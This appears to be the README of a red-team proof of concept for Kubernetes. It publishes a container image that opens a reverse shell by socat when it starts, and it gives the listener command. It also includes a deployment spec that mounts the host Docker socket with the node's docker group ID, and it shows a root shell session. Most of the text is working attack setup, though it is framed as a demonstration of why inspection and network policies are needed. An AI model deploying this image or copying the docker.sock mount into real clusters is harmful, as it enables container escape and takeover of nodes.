This is a proof of concept aimed to demonstrate the need to implement containter inspection, network security policies, etc. in a Kubernetes cluster. Also a reminder to always review carefully what a docker container or kubernetes deployment /helm chart.

This deployment launches a docker container available in docker hub as below:

    docker pull jordimiralles/redteam-gkpown:latest

Whem the docker container starts it sends a reverse shell with socat to the specified addres and port. If your destination server is listening for that connection, like this, for example: 

        socat file:`tty`,raw,echo=0 tcp-listen:9532

At this point we have direct access to the docker. The fun part of the deal though is that the deployment also assigned the container the same group id as the kubernetes nodes, like this:

        spec:
          securityContext:
            fsGroup: 412    # Group ID of docker group on k8s nodes.
          containers:
            - name: gkpown
              image: jordimiralles/redteam-gkpown
              imagePullPolicy: Always
              volumeMounts:
                - name: dockersock 
                  mountPath:   "/var/run/docker.sock"
          volumes:
          - name: dockersock 
            hostPath:
    path: /var/run/docker.sock

So we should have access to all the node context.You can check it very easily:
    
    tux at basecamp in ~/code/github/redteam-gkpown (master●●)
    $  socat file:`tty`,raw,echo=0 tcp-listen:9532
    /bin/sh: can't access tty; job control turned off
    /gkpown # 
    /gkpown # 
    /gkpown # 
    /gkpown # 
    /gkpown # whoami
    root
    /gkpown # df -h
    Filesystem                Size      Used Available Use% Mounted on
    overlay                  25.4G     18.3G      7.0G  72% /
    tmpfs                     6.4G         0      6.4G   0% /dev
    tmpfs                     6.4G         0      6.4G   0% /sys/fs/cgroup
    /dev/sda1                25.4G     18.3G      7.0G  72% /dev/termination-log
    /dev/sda1                25.4G     18.3G      7.0G  72% /etc/resolv.conf
    /dev/sda1                25.4G     18.3G      7.0G  72% /etc/hostname
    /dev/sda1                25.4G     18.3G      7.0G  72% /etc/hosts
    shm                      64.0M         0     64.0M   0% /dev/shm
    tmpfs                     6.4G      2.0M      6.4G   0% /run/docker.sock
    tmpfs                     6.4G     12.0K      6.4G   0% /run/secrets/kubernetes.io/serviceaccount
    tmpfs                     6.4G         0      6.4G   0% /proc/kcore
    tmpfs                     6.4G         0      6.4G   0% /proc/timer_list
    tmpfs                     6.4G         0      6.4G   0% /sys/firmware
